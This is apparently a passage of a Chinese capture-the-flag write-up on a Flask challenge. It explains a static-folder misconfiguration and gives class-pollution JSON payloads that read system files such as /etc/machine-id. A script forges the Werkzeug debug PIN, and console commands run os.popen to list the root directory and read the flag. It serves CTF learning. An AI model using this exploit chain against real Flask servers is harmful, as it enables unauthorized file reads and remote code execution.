Flask 应用实例是整个应用的核心，负责处理用户的请求并返回相应的响应。可以通过 app.route 装饰器定义路由，将不同的 URL 请求映射到对应的处理函数上。
app 对象包含了大量的功能和方法，例如 route、run、add_url_rule 等，这些方法用于处理请求和设置应用的各种配置。
通过 app.run() 方法，我们可以在指定的主机和端口上启动 Flask 应用，使其监听并处理客户端的请求。
`_static_folder` 全局变量：

`_static_folder` 是 Flask 应用中用于指定静态文件的文件夹路径。静态文件通常包括 CSS、JavaScript、图像等，用于展示网页的样式和交互效果。
静态文件可以包含在 Flask 应用中，例如 CSS 文件用于设置网页样式，JavaScript 文件用于实现网页的交互功能，图像文件用于显示图形内容等。
在 Flask 中，可以通过 app.static_folder 属性来访问 `_static_folder`，并指定存放静态文件的文件夹路径。默认情况下，静态文件存放在应用程序的根目录下的 static 文件夹中。
Flask 在处理请求时，会自动寻找静态文件的路径，并将静态文件发送给客户端，使网页能够正确地显示样式和图像。
综上所述，app 和 `_static_folder` 这两个全局变量在 Flask 应用中都扮演着重要的角色，app 是整个应用的核心实例，用于处理请求和设置应用的配置，而 `_static_folder` 是用于指定静态文件的存放路径，使网页能够正确地加载和显示样式和图像。
`/static/proc/1/environ`：由于"`_static_folder`":"/"把静态目录直接设置为了根目录，所以根目录下`/proc/1/environ`可以通过访问静态目录`/static/proc/1/environ`访问。
如果按算pin码的方法，可以这样做，先污染
```
{
	"username":"1",
	"password":"1",
	"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":{
		"__globals__":{
			"__file__":"/proc/self/cgroup"
		}
	}
}
```
可以得到![](/image/347.png)
取cgroup值为
```
docker-707622b1952144e409fedf8bb699ac6071b542e320d9f86e86165d91b940702c.scope
```
再拿uuid
```
{
	"username":"1",
	"password":"1",
	"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":{
		"__globals__":{
			"__file__":"/sys/class/net/eth0/address"
		}
	}
}
```
拿到uuid为
```
42:bf:7d:15:ab:5e
```
记得把`uuid`转为十进制
拿`machine-id`
```
{
	"username":"1",
	"password":"1",
	"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":{
		"__globals__":{
			"__file__":"/etc/machine-id"
		}
	}
}
```
拿到为
```
96cec10d3d9307792745ec3b85c89620
```

算pin码的脚本
```python
import hashlib
from itertools import chain


probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]


# This information is here to make it harder for an attacker to
# guess the cookie name.  They are unlikely to be contained anywhere
# within the unauthenticated debug page.
private_bits = [
    '73390204758878',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
    #'96cec10d3d9307792745ec3b85c89620 867ab5d2-4e57-4335-811b-2943c662e936 aec7efb63a2cb8671f0c43f4fa2aa56e943a6b1480fb8454f2ee3df6a266c8cf'
    '96cec10d3d9307792745ec3b85c89620docker-707622b1952144e409fedf8bb699ac6071b542e320d9f86e86165d91b940702c.scope'
]


h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")


cookie_name = f"__wzd{h.hexdigest()[:20]}"


# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]


# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)


```
运行得到pin码，输入后进入控制台就可以rce了.
访问`/console`路由，输入`PIN`码，好的拿到控制台的权限，接下来就是`rce`了
```
[console ready]
>>> import os
>>> os.popen('ls /').read()
'app\nbin\nboot\ndev\netc\nflag123123_is312312312_here3123213\nhome\nl  [](http://76f87c5d-e573-4e5e-9c2c-7e403de1b5e2.node5.buuoj.cn:81/console#)  
>>> os.popen('cat /flag123123_is312312312_here3123213').read()
'flag{e10b38d9-ac06-4670-a95e-9b2f9e44f450}\n'
>>>
```
得到flag。




























## 参考文章
https://tttang.com/archive/1876/
https://www.cnblogs.com/CAPD/p/17818200.html
https://forum.butian.net/share/3615
https://blog.csdn.net/Jayjay___/article/details/132123785